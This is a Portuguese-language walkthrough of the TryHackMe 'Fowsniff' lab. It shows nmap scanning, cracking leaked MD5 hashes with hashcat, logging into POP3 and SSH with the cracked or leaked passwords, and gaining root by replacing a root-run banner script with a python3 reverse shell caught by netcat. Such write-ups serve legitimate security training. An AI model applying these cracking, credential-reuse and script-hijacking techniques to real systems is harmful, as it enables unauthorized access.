> [!WARNING]
> This writeup is in portuguese. For the english version, please follow [this link](./Writeup%20(EN-US).md).

# [Fowsniff CTF](https://tryhackme.com/room/ctf)

<a href="https://tryhackme.com/room/ctf"><figure><img src="./assets/logo.jpeg" width="175" title="tryhackme.com - © TryHackMe"></figure></a>

> Hack this machine and get the flag. There are lots of hints along the way and is perfect for beginners!

Capture The Flag original disponível em [Try Hack Me](https://tryhackme.com/room/ctf), feito por [ben](https://tryhackme.com/p/ben).

Dificuldade: `Fácil`

Resolvido em: `2026/05/29`

# Conteúdos

- [Fowsniff CTF](#fowsniff-ctf)
- [Conteúdos](#conteúdos)
- [Writeup](#writeup)
   * [Reconhecimento](#reconhecimento)
   * [Exploração](#exploração)
   * [Escalação de privilégio](#escalação-de-privilégio)

# Writeup

## Reconhecimento

Iniciando a máquina, adicionei ela ao DNS local `/etc/hosts` como `ctf.net` e testei a conexão com ping. Tudo certo, então segui para mapear o canal com `nmap`:[^nmap]

```bash
$ nmap -T4 <MACHINE_IP>
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-29 20:32 UTC
Nmap scan report for ctf.net (<MACHINE_IP>)
Host is up (0.14s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
110/tcp open  pop3
143/tcp open  imap

Nmap done: 1 IP address (1 host up) scanned in 2.41 seconds
```

Bem, tem um `http`, um `ssh`, e um sistema de emails com `pop3` e `imap`. No `http` temos apenas um aviso de vazamento de dados... Usualmente, para a solução desta máquina, seria necessário acessar o twitter marcado na página e eventualmente encontrar um pastebin. Contudo, o pastebin foi derrubado num falso positivo, e hoje em dia é extremamente difícil abrir o X sem uma conta (eu não tenho uma). Logo, segui usando o `.txt` fornecido pelo próprio autor, que encontrei após uma pesquisa online: [fowsniff.txt](https://github.com/berzerk0/Fowsniff/blob/main/fowsniff.txt).

Com ele, fica bem mais claro o que fazer. Temos 9 emails e 9 hashes! E de acordo com o próprio `fowsniff.txt`, estes hashes são `MD5`.

```
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e

...

MD5 is insecure, so you shouldn't have trouble cracking them but I was too lazy haha =P
```

Para quebrar os hashes usei `hashcat`[^hashcat] junto da wordlist de senhas rockyou[^rockyou], com o seguinte comando:

```bash
$ hashcat -a 0 -m 0 'HASH' /usr/share/wordlists/rockyou.txt.gz
```

De todos os 9 emails, apenas 1 não tinha uma senha presente no rockyou (foreshadowing). Ótimo!

```
mauer@fowsniff:<PASS0>
mustikka@fowsniff:<PASS1>
tegel@fowsniff:<PASS2>
baksteen@fowsniff:<PASS3>
seina@fowsniff:<PASS4>
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:<PASS5>
parede@fowsniff:<PASS6>
sciana@fowsniff:<PASS7>
```

## Exploração

Com isso segui para o email, e tentei cada combinação disponível, torcendo para que alguém não tenha ainda trocado sua senha...

```bash
$ telnet ctf.net 110
Trying <MACHINE_IP>...
Connected to ctf.net.
Escape character is '^]'.
+OK Welcome to the Fowsniff Corporate Mail Server!
user <USER_EM>
+OK
pass <PASS_EM>
+OK Logged in.
list
+OK 2 messages:
1 1622
2 1280
```

Não só entrei em uma conta, mas tinha dois emails prontos para serem lidos! Opa...

Email 1 (1622) é um aviso de A. J. Stone sobre o vazamento de informações e uma ordem para alterar as senhas, incluindo o fato que as senhas de todos eram inseguras. Realmente... 

Ele também fornece uma senha para o `ssh`, `<PASS_SSH>`, só que não funciona com o usuário `<USER_EM>`:

```bash
$ ssh <USER_EM>@ctf.net
<USER_EM>@ctf.net's password: <PASS_SSH>
Permission denied, please try again.
```

Mas obtive um outro nome no segundo email...

```
Devin,

...

I'm going to head home early and eat some chicken soup. 
I think I just got an email from Stone, too, but it's probably just some
"Let me explain the tone of my meeting with management" face-saving mail.
I'll read it when I get back.

Feel better,

Skyler
```

Ótimo! Temos um erro humano e uma grande possibilidade de acesso. Usando o email do Skyler, o acesso ao `ssh` acontece:

```bash
$ ssh <USER_SSH>@ctf.net
<USER_SSH>@ctf.net's password: <PASS_SSH>
$ ssh baksteen@ctf.net

                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| '__| '_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions


   ****  Welcome to the Fowsniff Corporate Server! **** 

              ---------- NOTICE: ----------

 * Due to the recent security breach, we are running on a very minimal system.
 * Contact AJ Stone -IMMEDIATELY- about changing your email and SSH passwords.


Last login: Tue Mar 13 16:55:40 2018 from <OTHER_IP0>
<USER_SSH>@fowsniff:~$ whoami
<USER_SSH>
```

## Escalação de privilégio

```bash
<USER_SSH>@fowsniff:~$ sudo -l
[sudo] password for <USER_SSH>: 
Sorry, user <USER_SSH> may not run sudo on fowsniff.
```

Droga! Bem, usando as dicas no Try Hack Me, ele diz para procurar arquivos que o usuário possa executar. Ou seja:

```bash
$ find / -group users -type f 2>/dev/null
/opt/cube/cube.sh
...
```

Um script de shell? O primeiro resultado da busca, também! Ao olhar o script, é o banner que aparece ao entrar no `ssh`. É *altamente* provável que isso é executado com root, na inicialização do `ssh`.

Com o reverse shell[^rv] fornecido pelo próprio desafio, eu substitui o script para executar `python3`.[^py] Eu também coloquei o `netcat`[^nc] para ouvir na porta `1234` e finalmente realizei o login no ssh novamente:

```bash
$ ssh <USER_SSH>@ctf.net
<USER_SSH>@ctf.net's password: <PASS_SSH>
# whoami
root
```

Incrível! Depois de olhar um pouco nos arquivos:

```bash
# cd /root
cd /root
# cat flag.txt
cat flag.txt
   ___                        _        _      _   _             _ 
  / __|___ _ _  __ _ _ _ __ _| |_ _  _| |__ _| |_(_)___ _ _  __| |
 | (__/ _ \ ' \/ _` | '_/ _` |  _| || | / _` |  _| / _ \ ' \(_-<_|
  \___\___/_||_\__, |_| \__,_|\__|\_,_|_\__,_|\__|_\___/_||_/__(_)
               |___/ 

 (_)
  |--------------
  |&&&&&&&&&&&&&&|
  |    R O O T   |
  |    F L A G   |
  |&&&&&&&&&&&&&&|
  |--------------
  |
  |
  |
  |
  |
  |
 ---

Nice work!

This CTF was built with love in every byte by @berzerk0 on Twitter.

Special thanks to psf, @nbulischeck and the whole Fofao Team.
```

[^nmap]: https://github.com/nmap/nmap
[^nc]: https://nc110.sourceforge.io/
[^rv]: https://en.wikipedia.org/wiki/Shell_shoveling
[^hashcat]: https://hashcat.net/hashcat/
[^rockyou]: https://weakpass.com/wordlists/rockyou.txt
[^py]: https://www.python.org/